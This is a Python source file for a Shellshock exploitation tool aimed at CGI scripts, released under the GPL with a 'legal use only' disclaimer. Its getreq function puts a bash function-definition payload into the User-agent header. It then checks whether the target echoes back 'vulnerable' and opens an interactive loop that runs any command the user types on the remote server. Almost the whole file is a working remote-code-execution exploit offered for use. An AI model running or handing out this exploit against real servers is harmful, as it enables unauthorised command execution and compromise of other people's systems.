# shellshockcgitool - A CGI Script Shellshock Exploitation Tool
# Copyright (C) 2021 athanasios.mitragkas@gmail.com
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  The author accepts no liability
# for damage caused by this tool.  If these terms are not acceptable to you, then
# do not use this tool.
#
# In all other respects the GPL version 2 applies:
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.


import requests as req
import os


def getreq(url, command):
    headers = {
        'User-agent':  "() { \:;}; echo; echo; /bin/bash -c '" + command + "'"}
    request = req.get(url, headers=headers)
    return request.text


def checkhost(url):
    request = req.get(url)
    if request.status_code >= 400:
        return False
    else:
        return True


def Isvulnerable(url):
    response = getreq(url, 'echo vulnerable')
    if 'vulnerable' in response:
        print("\n[\033[92m+\033[0m] \033[92mTarget seems to be vulnerable.\033[0m \n")
        return True
    else:
        print(
            "\n[\033[91m-\033[0m] \033[91mTarget seems not to be vulnerable.\033[0m\n")
        return False


def clearscrn():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


print("""
        ╔═╗╦ ╦╔═╗╦  ╦  ╔═╗╦ ╦╔═╗╔═╗╦╔═
        ╚═╗╠═╣║╣ ║  ║  ╚═╗╠═╣║ ║║  ╠╩╗
        ╚═╝╩ ╩╚═╝╩═╝╩═╝╚═╝╩ ╩╚═╝╚═╝╩ ╩
            Developed by sAsPeCt
            Exploit CGI Scripts
        """)

rhosts = input("Provide the full URL to the CGI Script (Include http://): ")
try:
    is_alive = checkhost(rhosts)
    if not is_alive:
        print(
            "\n\033[91mHost seems down or you don't have access to this resource.\033[0m")
    else:
        is_vulnerable = Isvulnerable(rhosts)
        if is_vulnerable:
            while True:
                cmd = input("$ ")
                if cmd == 'exit':
                    break
                elif cmd == 'clear':
                    clearscrn()
                resp = getreq(rhosts, cmd)
                print(resp)

except(req.exceptions.MissingSchema, req.exceptions.ConnectionError):
    print(
        "\n\033[91mInaccessible Host! | Please, include http:// in the url.\033[0m")

# CGI Script Shellshock Exploitation Tool Developed by sAsPeCt.sh
